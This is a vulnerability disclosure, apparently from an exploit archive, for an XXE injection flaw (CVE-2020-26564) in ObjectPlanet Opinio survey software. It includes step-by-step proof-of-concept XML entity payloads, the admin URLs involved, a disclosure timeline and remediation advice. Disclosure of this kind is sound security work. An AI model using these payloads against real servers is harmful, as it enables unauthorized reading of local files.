@@ -1,0 +1,84 @@
+id: 36609
+date: 07/30/2021
+title: ObjectPlanet Opinio 7.13 / 7.14 XML Injection Vulnerability
+author: Daniel Tan
+cves: CVE-2020-26564
+
+# Exploit Authors: Timothy Tan , Daniel Tan, Yu EnHui, Khor Yong Heng
+# CVE: CVE-2020-26564
+
+# Exploit Title: ObjectPlanet Opinio version 7.13/7.14 allows XXE injection
+# Vendor Homepage: https://www.objectplanet.com/opinio/
+# Software Link: https://www.objectplanet.com/opinio/
+# Exploit Authors: Timothy Tan , Daniel Tan, Yu EnHui, Khor Yong Heng
+# CVE: CVE-2020-26564
+
+# Timeline
+- September 2020: Initial discovery
+- October 2020:  Reported to ObjectPlanet
+- November 2020:  Fix/patch provided by ObjectPlanet
+- July 2021:  CVE-2020-26564
+
+# 1. Introduction
+Opinio is a survey management solution by ObjectPlanet that allows surveys to be designed, published and managed.
+
+# 2. Vulnerability Details
+ObjectPlanet Opinio before version 7.13 and 7.14 is vulnerable to XXE injection.
+
+# 3. Proof of Concept
+
+### XXE leading to local file disclosure ###
+
+Step 1: 
+
+URL: /opinio/admin/file.do?action=viewEditFileResource&resourceType=6&resourcePatch=upload/css/common/blueSurvey.css
+
+Opinio allows an administrative user to edit local CSS files, this is used to change the contents of a CSS file to a dtd reference file for the XXE injection
+The existing blueSurvey.css file was chosen for this PoC. Replace the contents of the file with:  
+
+<!ENTITY all "%start;%file;%end;">
+
+-------------------------------------------------------
+
+Step 2: 
+
+Utilize Opinios survey module and create a generic survey template. Export the template .xml file and add this snippet into the top of the .xml file:
+
+<!ENTITY % file SYSTEM "file:////C:\Users\">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM
+"file:////C:\<BASE_DIRECTORY>\opinio\upload\css\common\blueSurvey.css">
+%dtd;
+
+Ensure the surveyIntro tag is inserted with the following payload (This will output the result in the
+surveyIntro field):
+
+<surveyIntro>&all;</surveyIntro>
+
+The base directory can be guessed via the information under Setup >> Edit System Settings , this page on Opinio shows the local directory of where Opinio was installed to. 
+
+Import the modified .xml file to: 
+/survey/admin/folderSurvey.do?action=viewImportSurvey['importFile']
+
+-------------------------------------------------------
+
+Step 3: 
+
+The C:\Users\ directory can be viewed at :
+/opinio/admin/preview.do?action=previewSurvey&surveyId=<SURVEY_ID>
+
+
+This vulnerability was confirmed by ObjectPlanet Opinio in their patch notes which can be found at : https://www.objectplanet.com/opinio/changelog.html
+
+
+# 4. Remediation
+Apply the latest fix/patch from objectplanet.
+
+# 5. Credits
+Timothy Tan (https://sg.linkedin.com/in/timtjh)
+Khor Yong Heng (https://www.linkedin.com/in/khor-yong-heng-66108a120/)
+Yu EnHui (https://www.linkedin.com/in/enhui-yu-88691b15b/)
+Daniel Tan (https://www.linkedin.com/in/dantanjk/)
+
+#  0day.today [2023-03-25]  #
